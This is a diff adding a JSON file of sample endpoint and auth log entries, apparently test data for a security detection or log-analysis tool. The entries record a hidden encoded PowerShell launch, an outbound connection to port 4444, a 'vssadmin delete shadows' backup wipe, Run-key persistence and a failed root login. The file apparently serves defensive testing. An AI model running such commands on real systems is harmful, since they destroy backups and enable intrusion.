@@ -1,0 +1,10 @@
+{
+  "version": 1,
+  "entries": [
+    { "ts": "2026-07-01T14:32:07.412Z", "host": "win-ep-04", "source": "sysmon", "action": "process_start", "user": "svc-batch", "message": "powershell.exe -nop -w hidden -enc SQBFAFgAKABJAFcAUgAg...", "fields": { "pid": 6624, "ppid": 4188 } },
+    { "ts": "2026-07-01T14:32:06.981Z", "host": "win-ep-04", "source": "sysmon", "action": "network_connection", "user": "svc-batch", "message": "Outbound TCP 10.0.0.5:51344 -> 185.220.101.34:4444", "fields": { "pid": 6624 } },
+    { "ts": "2026-07-01T14:31:52.006Z", "host": "win-ep-04", "source": "sysmon", "action": "process_start", "user": "svc-batch", "message": "vssadmin.exe delete shadows /all /quiet", "fields": { "pid": 7710, "ppid": 6624 } },
+    { "ts": "2026-07-01T14:30:58.320Z", "host": "win-ep-04", "source": "sysmon", "action": "registry_set", "user": "svc-batch", "message": "HKCU\\...\\Run\\Updater = C:\\ProgramData\\svc.exe", "fields": { "pid": 6624 } },
+    { "ts": "2026-07-01T14:29:44.882Z", "host": "lnx-jump-01", "source": "auth", "action": "authentication", "user": "root", "message": "Failed password for root from 203.0.113.9 port 51004" }
+  ]
+}
